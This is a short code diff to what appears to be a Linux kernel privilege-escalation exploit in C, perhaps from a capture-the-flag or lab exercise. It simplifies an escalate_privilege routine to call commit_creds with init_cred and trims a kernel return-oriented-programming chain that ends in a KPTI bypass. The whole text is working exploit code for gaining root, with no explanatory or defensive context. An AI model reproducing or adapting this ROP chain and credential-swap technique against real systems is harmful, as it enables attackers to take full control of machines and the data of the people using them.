@@ -58,23 +58,13 @@ void restore_state(void) {
 
 void escalate_privilege(void) {
     puts("[+] escalating privilege");
-    char *(*pkc)(int) = (void *)(addr_prepare_kernel_cred);
     void (*cc)(char *) = (void *)(addr_commit_creds);
-    if (addr_init_cred == DUMMY_VALUE + kbase_offset) {
-        (*cc)((*pkc)(0));
-    } else {
-        (*cc)((char *)addr_init_cred);
-    }
+    (*cc)((char *)addr_init_cred);
     restore_state();
 }
 
 void krop(u64 *ptr) {
     *ptr++ = pop_rdi_ret;
-    *ptr++ = 0;
-    *ptr++ = addr_prepare_kernel_cred;
-    *ptr++ = pop_rcx_ret;
-    *ptr++ = 0;
-    *ptr++ = mov_rdi_rax_rep_ret;
     *ptr++ = addr_commit_creds;
     *ptr++ = bypass_kpti;
     *ptr++ = 0xdeadbeef;
